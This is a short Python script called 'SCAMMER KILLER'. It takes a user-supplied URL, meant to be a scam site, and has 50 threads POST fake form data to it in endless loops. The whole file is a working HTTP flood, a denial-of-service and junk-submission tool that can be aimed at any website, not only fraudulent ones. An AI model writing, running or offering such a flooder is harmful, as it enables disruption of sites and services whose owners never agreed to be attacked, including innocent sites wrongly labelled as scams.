
#SCAMMER KILLER
import requests
import threading
import socket

#Copy URL from Scam message
url = str(input("Enter Scam URL: "))

#In the console copy the request headers/data sent

data = {
    "fname": "mike",
    "lname": "any",
    "id": "A112",
    "number": "0009"
}

def do_request():
    while True:
        a = 0
        a += 1
        response = requests.post(url, data=data)
        print(a, response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()